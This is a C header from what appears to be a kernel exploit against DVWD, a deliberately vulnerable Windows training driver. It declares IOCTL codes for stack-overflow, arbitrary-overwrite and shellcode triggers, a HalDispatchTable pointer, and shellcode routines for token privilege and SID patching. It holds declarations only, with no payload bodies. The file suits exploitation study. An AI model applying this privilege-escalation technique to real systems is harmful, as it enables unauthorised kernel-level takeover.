#ifndef __KERNEL_ARCH_H
#define __KERNEL_ARCH_H

#include <windows.h>
#include <winioctl.h>
#include <Sddl.h>

/* Generic */

#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L) 
#define ZwCurrentProcess() ( (HANDLE)(LONG_PTR) -1 ) 


/* IoControl Codes */

#define DEVICEIO_DVWD_STACKOVERFLOW  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA) 
#define DEVICEIO_DVWD_OVERWRITE      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define DEVICEIO_DVWD_SHELLCODE      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define DEVICEIO_DVWD_SHELLCODEUSER  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define DEVICEIO_DVWD_STORE          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)


/* Arbitrary Overwrite IoControl DEVICEIO_DVWD_OVERWRITE Structure */

typedef struct _ARBITRARY_OVERWRITE_STRUCT
{
  PVOID StorePtr;
  ULONG Size;
} ARBITRARY_OVERWRITE_STRUCT, *PARBITRARY_OVERWRITE_STRUCT;



/* Kernel Shellcode C-like functions */  

extern VOID ShellcodePrivilegesAdd(VOID);
extern VOID UserShellcodeSIDListPatchUserKillMe(VOID);
extern VOID UserShellcodeSIDListPatchUser(VOID);
extern ULONG_PTR __stdcall UserShellcodeSIDListPatchUser4Args(DWORD Arg1, DWORD Arg2, DWORD Arg3, DWORD Arg4);
extern VOID __cdecl UserShellcodeSIDListPatchCallGate();


/* Kernel function addresses 
 * - for x64: the compiler always uses the standard calling convention
     for this reason calling-convention attributes are simply ignored in this enviroment 
 */

typedef          VOID *PEPROCESS;
typedef     PEPROCESS (__stdcall *_PsGetCurrentProcess)(VOID);
typedef         ULONG (__cdecl   *_DbgPrint)(PCHAR  Format, ...); 
typedef PACCESS_TOKEN (__stdcall *_PsReferencePrimaryToken)(PEPROCESS Process); 
typedef          VOID (__stdcall *_PsDereferencePrimaryToken)(PACCESS_TOKEN  PrimaryToken); 
typedef      NTSTATUS (__stdcall *_ZwTerminateProcess)(HANDLE  ProcessHandle, NTSTATUS  ExitStatus);
typedef          VOID (__stdcall *_KeTerminateThread)(PVOID unused);   
typedef      NTSTATUS (__stdcall *_PsLookupProcessByProcessId)(HANDLE ProcessId, PEPROCESS *Process);
typedef          VOID (__stdcall *_ObDereferenceObject)(PVOID  Object);
typedef      NTSTATUS (__stdcall *_ZwClose)(HANDLE  Handle);



extern DWORD cmdProcessId;
extern HANDLE deviceHandle;

extern ULONG_PTR                   HalDispatchTable;
extern DWORD                       cmdProcessId;
extern PVOID                       hardcodedReturn; /* x64 stack overflow recovery */

extern _PsGetCurrentProcess        PsGetCurrentProcess;
extern _DbgPrint                   DbgPrint;
extern _PsReferencePrimaryToken    PsReferencePrimaryToken;
extern _PsDereferencePrimaryToken  PsDereferencePrimaryToken;
extern _KeTerminateThread          KeTerminateThread;
extern _PsLookupProcessByProcessId PsLookupProcessByProcessId;
extern _ZwTerminateProcess         ZwTerminateProcess;
extern _ObDereferenceObject        ObDereferenceObject;
extern _ZwClose                    ZwClose;


#endif // __KERNEL_ARCH_H




